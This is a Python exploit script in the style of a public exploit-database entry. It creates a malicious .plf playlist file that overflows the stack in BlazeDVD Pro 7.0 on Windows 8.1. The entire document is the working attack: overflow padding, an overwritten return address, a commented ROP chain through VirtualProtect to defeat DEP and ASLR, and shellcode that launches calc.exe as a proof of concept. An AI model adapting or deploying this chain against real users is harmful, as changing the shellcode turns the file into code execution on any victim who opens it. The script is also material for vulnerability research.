# BlazeDVD Pro v7.0 - (.plf) Stack Based Buffer Overflow (direct RET) - ALSR/DEP bypass on Win8.1 Pro
# Date: Mon, Aug 11 2014 12:58:06 GMT
# Exploit Author: Giovanni Bartolomucci
# Vendor Homepage: http://www.blazevideo.com/
# Software Link: http://www.blazevideo.com/download/BlazeDVDProSetup.exe
# Version: 7.0.0.0
# Tested on: Windows 8.1 Pro
# h/t to corelanc0d3r and b33f for their tutorials

#!/usr/bin/python
 
import sys, struct
 
file = "calc.plf"

junk1   = "\x41"*260
neweip  = "\x5b\x51\x32\x60"
junk2   = "\x41"*24

rop =  "\x41\x47\x32\x60" # POP EBP # RETN [Configuration.dll]
rop += "\xb5\x59\x33\x60" # &(PUSH ESP # RET 0x0C) [Configuration.dll]
rop += "\xf6\x07\x33\x60" # POP EAX # RET [Configuration.dll]
rop += "\x91\x11\x11\x11" # Value to be subtracted, will become 0x000000080
rop += "\x39\x03\x33\x60" # POP ECX # RETN [Configuration.dll]
rop += "\x11\x11\x11\x11" # Value to subtract
rop += "\xda\x6d\x32\x60" # SUB EAX,ECX # RETN [Configuration.dll]
rop += "\x7d\x41\x32\x60" # XCHG EAX,EBX # XOR AL,60 # RETN [Configuration.dll]
rop += "\xf6\x07\x33\x60" # POP EAX # RETN [Configuration.dll]
rop += "\x47\x98\x31\x60" # Junk R address
rop += "\x47\x98\x31\x60" # POP EDX # ADD AL,BYTE PTR ES:[EAX] # NOP # NOP # NOP # NOP # NOP # MOV EAX,Configur.60346A70 # RETN [Configuration.dll]
rop += "\x51\x11\x11\x11" # Value to be subtracted, will become 0x000000040
rop += "\xf6\x07\x33\x60" # POP EAX # RETN [Configuration.dll]
rop += "\x11\x11\x11\x11" # Value to subtract
rop += "\x78\x8b\x30\x60" # SUB EDX,EAX # XOR EAX,EAX # CMP ECX,EDX # SETG AL # RETN 0x04 [Configuration.dll]
rop += "\x8c\xf0\x33\x60" # POP ECX # RETN [Configuration.dll]
rop += "\x41\x41\x41\x41" # Junk
rop += "\x0b\x17\x36\x60" # & Writable location [Configuration.dll]
rop += "\xee\x78\x32\x60" # POP EDI # RETN [Configuration.dll]
rop += "\x09\x48\x32\x60" # RETN (ROP NOP) [Configuration.dll]
rop += "\x65\x08\x33\x60" # POP EAX # RETN [Configuration.dll]
rop += "\xcc\x42\x05\x64" # ptr to &VirtualProtect() [IAT MediaPlayerCtrl.dll]
rop += "\xed\xd6\x33\x60" # MOV ESI,DWORD PTR DS:[EAX] # RETN [Configuration.dll]
rop += "\xa2\x92\x32\x60" # POP EAX # RETN [Configuration.dll]
rop += "\x90\x90\x90\x90" # NOP
rop += "\x28\xc3\x33\x60" # PUSHAD # RETN [Configuration.dll]

shellcode = ("\x66\x81\xE4\xFC\xFF\x31\xD2\x52\x68\x63"
             "\x61\x6C\x63\x89\xE6\x52\x56\x64\x8B\x72"
             "\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30"
             "\x8B\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78"
             "\x8B\x74\x1F\x20\x01\xFE\x8B\x4C\x1F\x24"
             "\x01\xF9\x42\xAD\x81\x3C\x07\x57\x69\x6E"
             "\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74"
             "\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7\xCC")

exploit = junk1 + neweip + junk2 + rop + shellcode
 
writeFile = open(file, "w")
writeFile.write(exploit)
writeFile.close()